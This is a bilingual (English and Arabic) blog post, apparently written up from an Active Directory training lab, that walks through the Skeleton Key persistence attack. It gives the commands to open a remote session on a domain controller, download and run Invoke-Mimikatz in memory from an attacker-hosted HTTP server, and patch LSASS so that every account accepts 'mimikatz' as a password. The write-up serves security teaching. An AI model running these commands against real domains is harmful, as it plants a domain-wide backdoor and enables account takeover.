@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Persistence - Skeleton Key | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Persistence - Skeleton Key</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-09-28</span>
+</div>
+<h1 class="post-title">Persistence - Skeleton Key</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will cover the third persistence technique for maintaining access to a Domain Controller: the Skeleton Key attack.</p>
+<h2>What is the Skeleton Key Technique?</h2>
+<p>The idea behind this technique is that it converts all passwords belonging to every user enrolled in Active Directory to an alternate password -- specifically, the password <code>mimikatz</code> -- while keeping their original passwords fully functional. In other words, after executing the Skeleton Key attack, every user in the domain can be authenticated using either their real password or the universal skeleton key password <code>mimikatz</code>.</p>
+<h2>Walkthrough</h2>
+<h3>Prerequisites</h3>
+<p>To execute this technique, you must have a PowerShell session running as a user who is a member of the <strong>Domain Admins</strong> group.</p>
+
+<figure class="article-img"><img src="../assets/images/skeleton-key/2.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 1: Enter a Remote Session on the Domain Controller</h3>
+<p>First, we need to connect to the Domain Controller by opening a remote PowerShell session. We do this using the following command:</p>
+<pre><code class="language-powershell">Enter-PSSession -ComputerName dcorp-dc
+</code></pre>
+<p>This gives us an interactive PowerShell session directly on the Domain Controller.</p>
+
+<figure class="article-img"><img src="../assets/images/skeleton-key/3.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 2: Set Up an HTTP Server for Mimikatz</h3>
+<p>Next, we need to start an HTTP server on the same path where Mimikatz is located. This allows us to download and load Mimikatz into memory on the Domain Controller. You can use Python's built-in HTTP server or any other method to host the file.</p>
+
+<figure class="article-img"><img src="../assets/images/skeleton-key/4.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 3: Load Mimikatz into Memory</h3>
+<p>Now we load the Mimikatz PowerShell script into memory on the Domain Controller by downloading and executing it directly using the following command:</p>
+<pre><code class="language-powershell">iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)
+</code></pre>
+<p>This downloads the <code>Invoke-Mimikatz.ps1</code> script from our HTTP server and loads it into the current PowerShell session's memory without writing it to disk.</p>
+
+<figure class="article-img"><img src="../assets/images/skeleton-key/5.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 4: Execute the Skeleton Key Attack</h3>
+<p>With Mimikatz loaded, we now execute the Skeleton Key injection by running:</p>
+<pre><code class="language-powershell">Invoke-Mimikatz -Command '&quot;misc::skeleton&quot;'
+</code></pre>
+<p>This patches the LSASS process on the Domain Controller so that all user accounts now accept <code>mimikatz</code> as a valid password in addition to their real passwords.</p>
+<h2>Verifying the Attack</h2>
+<p>Now that the skeleton key password has been injected for every user, let us verify that it works. We can pick any user in Active Directory -- for example, a user who is a member of the Domain Admins group such as <code>svcadmin</code> -- and attempt to open a PowerShell session using the skeleton key password <code>mimikatz</code>.</p>
+<p>After testing, we can confirm that we were able to launch a PowerShell session with the privileges of the <code>svcadmin</code> user using the password <code>mimikatz</code>. This works for any user enrolled in Active Directory, effectively giving us a universal backdoor password across the entire domain.</p>
+<figure class="article-img"><img src="../assets/images/skeleton-key/6.png" alt="Step 5" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في المقالة هذي راح اشرح التكنيك الثالث لتثبيت الاختراق على ال Domain Controller</p>
+<p>ايش هو تكنيك Skeleton Key؟</p>
+<p>فكرة هذا التكنيك انه يتم تحويل جميع كلمات المرور الخاصة بجميع المتسخدمين المضمنين في ال Active Directory الى باسورد اخر اللي وهو mimikatz مع بقاء فعالية الباسورد السابق الخاص فيهم</p>
+<p>الشرح:</p>
+<p>طبعا عشان نطبق التكنيك لازم نشغل جلسة PowerShell بمستخدم ضمن قروب Domain Admins</p>
+<figure class="article-img"><img src="../assets/images/skeleton-key/2.png" alt="Step 1" loading="lazy"></figure>
+
+<p>اول شي راح ندخل لجهاز Domain Controller عن طريق هذا الامر:</p>
+<p>Enter-PSSession -ComputerName dcorp-dc</p>
+<figure class="article-img"><img src="../assets/images/skeleton-key/3.png" alt="Step 2" loading="lazy"></figure>
+
+<p>بعد كذا راح نسوي تشغيل الى http server على نفس المسار اللي موجودة فيه Mimikatz</p>
+<p>الان راح اسوي Load ل اداة Mimikatz عن طريق هذا الامر:</p>
+<p>iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)</p>
+<figure class="article-img"><img src="../assets/images/skeleton-key/4.png" alt="Step 3" loading="lazy"></figure>
+
+<p>بعد كذا ننفذ هذا الامر:</p>
+<p>Invoke-Mimikatz -Command '"misc::skeleton"'</p>
+<p>الان تم اضافة باسورد الى كل مستخدم واللي هو mimikatz مع ضمان فعالية الباسورد السابق الخاص فيهم</p>
+<figure class="article-img"><img src="../assets/images/skeleton-key/5.png" alt="Step 4" loading="lazy"></figure>
+
+<p>الان خلونا نشوف اي مستخدم اخر مثلا يكون موجود في قروب Domain Admins مثلا المتسخدم svcadmin هل نقدر ندخل على جلسة PowerShell خاصه فيه عن طريق الباسورد mimikatz او لا</p>
+<p>قدرنا نشغل جلسة PowerShell بصلاحية المستخدم svcadmin ونقدر ايضا ب اي مستخدم مضمن في ال Active Directory</p>
+<figure class="article-img"><img src="../assets/images/skeleton-key/6.png" alt="Step 5" loading="lazy"></figure>
+
+<p>وصلنا الى نهاية المقالة</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
